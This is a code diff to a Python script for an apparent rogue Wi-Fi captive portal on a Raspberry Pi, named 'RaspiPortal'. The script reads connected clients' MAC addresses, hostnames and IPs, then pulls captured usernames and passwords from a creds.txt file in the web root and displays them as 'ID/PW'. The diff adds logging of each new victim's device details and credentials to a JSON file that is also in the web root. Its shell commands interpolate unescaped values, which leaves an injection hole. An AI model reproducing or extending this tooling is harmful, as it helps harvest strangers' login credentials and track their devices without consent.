@@ -13,6 +13,8 @@ import os, sys
 import subprocess
 import time 
 import signal
+import json
+from datetime import datetime
 
 
 from luma.core.interface.serial import i2c
@@ -21,7 +23,7 @@ from luma.oled.device import sh1106
 from PIL import ImageFont, Image 
 
 # USER EDITABLE
-DEBUG = 0	# 0/1 = off/on 
+DEBUG = 0   # 0/1 = off/on 
 
 # I2C interface and address
 serial = i2c(port=1, address=0x3C)
@@ -45,6 +47,9 @@ line5 = ""
 font_path = "/usr/local/etc/fonts/C&C Red Alert [INET].ttf"
 font2 = ImageFont.truetype(font_path, 12) 
 
+# Collected data log file
+outfile = "/var/www/html/data.txt"
+
 ##################
 # Functions
 ##################
@@ -52,13 +57,18 @@ font2 = ImageFont.truetype(font_path, 12)
 # BLINK
 def get_BLINK(blink):
     if DEBUG:
-	print ("get_BLINK()") 
+      print ("get_BLINK()") 
     return(not blink) 
+
+# DATE/TIME
+def get_DATE():
+    cur_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S') 
+    return(cur_date)
 
 # SSID
 def get_SSID():
     if DEBUG:
-	print ("get_SSID()") 
+      print ("get_SSID()") 
     cmd = '/sbin/iw dev wlan0 info|grep ssid|cut -d" " -f2-'
     returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
     returned_output = returned_output[:-1]
@@ -67,7 +77,7 @@ def get_SSID():
 # CLIENT MAC 
 def get_MAC():
     if DEBUG:
-	print ("get_MAC()") 
+      print ("get_MAC()") 
     cmd = '/sbin/iw dev wlan0 station dump|grep Station|head -1|cut -d" "  -f2'
     returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
     returned_output = returned_output[:-1]
@@ -76,9 +86,9 @@ def get_MAC():
 # CLIENT NAME
 def get_NAME(mac):
     if DEBUG:
-	print ("get_NAME("+str(mac)+")") 
+      print ("get_NAME("+str(mac)+")") 
     if (mac == ""):
-	mac = "NONE"
+      mac = "NONE"
     cmd = "grep -m1 "+str(mac)+" /var/lib/misc/dnsmasq.leases |cut -d' ' -f4"
     returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
     returned_output = returned_output[:-1]
@@ -87,9 +97,9 @@ def get_NAME(mac):
 # CLIENT IP
 def get_IP(mac):
     if DEBUG:
-	print ("get_IP("+str(mac)+")") 
+      print ("get_IP("+str(mac)+")") 
     if (mac == ""):
-	mac = "NONE"
+      mac = "NONE"
     cmd = "grep -m1 "+str(mac)+" /var/lib/misc/dnsmasq.leases |cut -d' ' -f3"
     returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
     returned_output = returned_output[:-1]
@@ -98,18 +108,27 @@ def get_IP(mac):
 # USER CREDS
 def get_USER(ip):
     if DEBUG:
-	print ("get_USER("+str(ip)+")") 
+      print ("get_USER("+str(ip)+")") 
     if (ip == ""):
-	ip = "NONE"
+      ip = "NONE"
     cmd = "tail -1 /var/www/html/creds.txt|grep "+str(ip)+"|cut -d'|' -f3"
     returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
     returned_output = returned_output[:-1]
     return(returned_output.decode("utf-8"))
 
+# WRITE TO FILE
+def write_file(outfile, data):
+    if DEBUG:
+      print "write_file()"+str(outfile)
+    f = open(outfile,'a')
+    f.write(json.dumps(data))
+    f.close()
+
+
 
 def exit_gracefully(signum, frame):
     with canvas(device) as draw:
-	draw.rectangle(device.bounding_box, outline="white", fill="black")
+      draw.rectangle(device.bounding_box, outline="white", fill="black")
     quit()
 
 
@@ -120,15 +139,26 @@ def exit_gracefully(signum, frame):
 signal.signal(signal.SIGINT, exit_gracefully)
 signal.signal(signal.SIGTERM, exit_gracefully)
 
+arr_data = []     # List
+d_data = {        # Dict
+    "date": '',
+    "mac" : '',
+    "name": '',
+    "user": ''
+    }
+arr_data.append(dict(d_data))
+
+cnt = 0           # New MACs count since last reboot
+
 while 1:
     # SCREEN
     with canvas(device) as draw:
-	draw.rectangle(device.bounding_box, outline="white", fill="black")
-	draw.text((5,5), line1, font=font2, fill="white")
-	draw.text((5,15), line2, font=font2, fill="white")
-	draw.text((5,25), line3, font=font2, fill="white")
-	draw.text((5,35), line4, font=font2, fill="white")
-	draw.text((5,45), line5, font=font2, fill="white") 
+      draw.rectangle(device.bounding_box, outline="white", fill="black")
+      draw.text((5,5), line1, font=font2, fill="white")
+      draw.text((5,15), line2, font=font2, fill="white")
+      draw.text((5,25), line3, font=font2, fill="white")
+      draw.text((5,35), line4, font=font2, fill="white")
+      draw.text((5,45), line5, font=font2, fill="white") 
 
     blink = get_BLINK(blink)
     line1 = "RaspiPortal  "+str(ch[blink]) 
@@ -150,8 +180,24 @@ while 1:
     line5 = "ID/PW: "+str(user)
     line5 = line5[:22]
 
+    # Store any new MACs seen
+    if not any(d['mac'] == mac for d in arr_data):
+          dt = get_DATE() 
+          d_data.update({   
+            "date": dt,
+            "mac" : mac,
+            "name": name,
+            "user": user 
+          })
+          arr_data.append(dict(d_data))
+          cnt = cnt + 1
+          write_file(outfile, d_data)
+
+    if blink == 0:
+      line1 = "RaspiPortal  "+str(cnt) 
+
     if DEBUG :
-	print ('Loop...') 
+      print ('Loop...') 
  
     time.sleep(1)
 
